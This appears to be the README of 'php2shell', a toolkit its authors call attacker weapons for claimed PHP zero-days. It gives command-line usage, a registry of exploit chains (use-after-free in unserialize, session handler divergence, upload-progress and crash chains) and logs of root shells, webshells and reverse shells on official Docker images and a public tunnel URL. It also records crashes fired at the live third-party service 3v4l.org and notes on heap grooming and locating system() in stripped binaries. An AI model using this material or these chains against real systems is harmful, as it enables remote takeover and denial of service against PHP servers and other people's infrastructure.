# php2shell weapons — usage and receipts

Single-file attacker weapons for the php2shell zero families. Self-reconning,
receipt-generating, no hardcoded per-build offsets (runtime ELF RELA scan),
every mode either works as shipped or says so in its output.

## The weapons

| file | what it is |
|---|---|
| `php2shell.py` | THE weapon: recon engine + chain list + fire. Point it at a target (URL / docker container / local binary), it fingerprints, lists viable chains with reasons, you pick, it fires and prints receipts. |
| `pwn_unserialize.py` | Standalone var-layer UAF ripper (zero4/zero5 local RCE + remote trigger delivery + NativePHP bridge delivery). Same chains as php2shell.py's local modules, standalone form. |
| `rs_listener.py` (built into php2shell.py) | hardened receipt listener (plain `nc -lvp` is broken in this WSL — playbook item 4). |

## Usage

```
python3 php2shell.py --target http://host/ [--lhost L] [--lport P]  # remote: recon -> options -> fire
python3 php2shell.py --local --php /path/to/php [--chain KEY] [--cmd CMD]  # local: direct binary RCE
python3 php2shell.py --docker <container> [--chain zero5 --cmd 'id; uname -a']  # vanilla Docker image
python3 php2shell.py --all  # fire every viable chain
python3 php2shell.py --list-chains

python3 pwn_unserialize.py --local --php /path/php --chain zero4|zero5|both --cmd 'id'
python3 pwn_unserialize.py --gen-trigger --gadget-class AppCacheFlusher
python3 pwn_unserialize.py --target http://host/ --endpoint /import.php --field data
python3 pwn_unserialize.py --native-bridge http://app/
```

Docker targets need `--security-opt seccomp=unconfined` (setarch -R personality).
Victim setups (real deployments) in `lab/`: `setup_wp_jammy.sh` (real WordPress
on Apache 2.4.52 + mod_php 8.1.2-1ubuntu2.27 — the never-patched Ubuntu 22.04
fleet stack, per-dir serialize_handler divergence), `up_van85_remote.sh`
(vanilla php:8.5.11-apache with a realistic session app + gadget),
`up_wordpress.sh` (wordpress:latest official image = vanilla PHP 8.3.36 +
mariadb, REAL WordPress), `import.php` (queue-import unserialize endpoint),
`fire_3v4l.sh` / `gen_trigger_3v4l.sh` (live third-party firing).

## Live-fire receipts (the weapon's own output, under receipts/)

| Target | Chain | Receipt |
|--------|-------|---------|
| **php:8.5.11-apache official Docker image (vanilla, default configure)** | zero4 | **FULL RCE `uid=0(root)`, 11s sweep** (`vanilla_zero4_docker_8511.log`) |
| **php:8.5.11-apache official Docker image** | zero5 | **FULL RCE `uid=0(root)` + container uname, 6s sweep** (`vanilla_zero5_docker_8511.log`) |
| **wordpress:latest official image (REAL WordPress, vanilla PHP 8.3.36)** | zero4 | **FULL RCE `uid=0(root)` + WP docroot listing, 1s sweep** (`vanilla_zero4_wordpress_8336.log`) |
| **wordpress:latest (vanilla PHP 8.3.36)** | zero5 | **FULL RCE `uid=0(root)`, 73s sweep** (`vanilla_zero5_wordpress_8336.log`) |
| Ubuntu jammy php8.1-cli 8.1.2-1ubuntu2.27 (never-patched fleet) | zero4 | **FULL RCE `uid=0` + dpkg receipt of the exact fleet build** (`unified_zero4_jammy_812.log`) |
| PHP 8.5.12 / 8.5.11 php.net source builds | zero4 + zero5 | FULL RCE `uid=0` each (`local_zero{4,5}_php85*.log`) |
| **https://marie-antibodies-nissan-broke.trycloudflare.com (public internet URL through real Cloudflare edge -> vanilla 8.5.11-apache)** | sessgap | **FULL RCE: webshell (uid=33 www-data) + LIVE INTERACTIVE REVERSE SHELL (id/whoami/php -v/uname captured)** (`live_tunnel_sessgap_public.log`) |
| vanilla 8.5.11-apache (local) | sessgap | same full chain (`remote_sessgap_van85_8511.log`) |
| **3v4l.org (live third-party infra, vanilla PHP 8.5.11)** | cformat | **SIGSEGV "Process exited with code 139 (Segmentation Fault)" on `C:11:"Dom\Element"` + classList read** (`live_3v4l_receipts.log`) |
| vanilla 8.5.11 apache worker, remote HTTP delivery | zero4 trigger | **worker death: "child pid 18 exit signal Segmentation fault (11)"** (`remote_pwnunserialize_glibc_kill.log` — glibc-heap worker; ZendMM workers take the documented silent-corruption path, `live_tunnel_pwnunserialize_remote.log` + `live_3v4l_gentrigger.log`) |

## Chain registry

| Key | Family | Modes | Target class |
|-----|--------|-------|-------------|
| sessgap | zero1 (CVE-2026-115560-class config differential) | remote | serialize_handler divergence configs + app destructor gadget; ANY PHP version |
| zero4 | var_destroy re-entry UAF (CWE-416) | local,docker | PHP 8.1 - 8.5.12 (receipted on vanilla 8.3.36/8.5.11, jammy 8.1.2, php.net 8.5.12) |
| zero5 | serialize-side mirror UAF | local,docker | PHP <= 8.5.12 (receipted on vanilla 8.3.36 + 8.5.11/8.5.12; use zero4 on 8.1) |
| uprog | rfc1867 upload-progress arms (CVE-2026-109618/19 shapes) | remote | unpatched fleet (jammy 8.1.2-1ubuntu2.27, <=8.5.11 without the Oct-2026 patch) |
| cformat | C: internal-class crasher (zero7) | remote | every 8.4/8.5 release branch (the b50b30c/4bf700e guard never left master) |
| nativephp | NativePHP bridge chain (zero6) | remote | every NativePHP mobile app (bridge + spool poison; lab receipts in ../php2shell-claude/nativephp_lane/receipts/) |
| win-sess | Windows O_NOFOLLOW=0 (zero9) | remote | Windows PHP builds (listed NOT VIABLE elsewhere) |

## Honest bounds

- Remote zero4/zero5 full RCE needs the target to expose an unserialize/
  serialize surface with a compatible gadget class (any destructor with a
  side effect). `--local`/`--docker` modes are the unconditional receipts
  (one command, no prerequisites). The REMOTE trigger delivery is receipted
  (silent corruption on ZendMM workers, worker SIGSEGV on glibc workers).
- sessgap needs the write/read serialize_handler divergence + an app
  destructor gadget (the demo victim defines DeferredWriter; on real targets
  enumerate the app's own gadget, phpGGC-style). Stock `php` both sides =
  no fire. Fires on ANY PHP version — config bug class, not a memory bug.
- uprog arms: fired 40 arms at the jammy WP lab without a kill signature in
  budget (with the original 8M memory_limit the first arm produced a 500
  OOM — the weapon now discriminates OOM 500s from crash 500s and keeps
  firing). Kill evidence for the jammy class remains the prior receipts in
  `../php2shell-claude/receipts_8512/lc_session_state/`. Vanilla 8.5.11 also
  survived the arm shapes — arms are jammy-calibrated; retune per target or
  use zero4/sessgap there.
- cformat is crash/DoS tier (fixed NULL offsets, not controllable RIP); the
  crash needs the app to touch the unserialized object (var_dump / property
  read / clone) — receipted live on 3v4l; remote delivery creates the object
  (result=true) on non-touching endpoints.
- nativephp full leak->write->call through the bridge remains open
  (env-tuning; see NATIVEPHP_STATUS.md) — the framework delivery of the UAF,
  controlled-pointer, exfil and event-forgery primitives are lab-receipted.

## Technical notes (what made vanilla work)

1. **zif_system without symbols**: ELF R_X86_64_RELATIVE scan — find the
   zend_function_entry whose fname reloc points at "system\0", the next
   reloc's addend is the handler; canary = adjacent exec/passthru/shell_exec
   handlers. Validated against dbgsym ground truths (jammy 0x21A780, 8.5.12
   0x523C60, 8.5.11 0x4D9930) and on stripped vanilla Docker builds (8.5.11:
   0x60CA60, 8.3.36: 0x48D4C0).
2. **zend_object_handlers offsets per line**: get_debug_info @+152 (8.1-8.3)
   vs @+160 (8.4-8.5) — clone_obj_with was inserted at +24 in 8.4+. The
   var_dump trigger fires inside zend_std_get_properties_for (both versions
   null-check get_properties_for and fall back to std, which calls
   get_debug_info — the receipted 8.5 mechanism, now version-parameterized).
3. **zero4 reclaim on jammy**: the forged pattern is prebuilt at top level so
   the destructor's ONLY allocation is the groom str_repeat — the inline
   pack() allocations pushed the groom off the freed page-run on the distro
   build (gdb receipt: freed block 0x7ffff4cc2000 == groom landing after the
   fix; the geometry bug was the get_debug_info offset, found via the crash
   backtrace in zend_std_get_properties_for:1891).
4. **Docker targets**: `--security-opt seccomp=unconfined` for setarch -R
   (personality is seccomp-gated in containers); carriers staged via docker
   cp, fired via `docker exec -w /tmp/w`.
5. **Session-gap mechanics**: the ukey (PHP_SESSION_UPLOAD_PROGRESS field
   value) lands verbatim as the session key (prefix+value, no truncation
   over raw sockets — curl -F `;` handling fakes truncation when testing by
   hand). cleanup=0 persists the key; the php read side splits at the first
   `|` and unserializes the injected object; the decode-failure path still
   fires the gadget destructor (the shell lands even though session_start
   warns "Session has been destroyed").
6. **Adaptive sweep**: every fired carrier dumps its own /proc/self/maps at
   script end; the sweep accumulates ZendMM chunk candidates from the actual
   runs (vanilla builds allocate many chunks; the -r probe alone misses
   them) — receipted windows first, then the full 2MB per chunk.
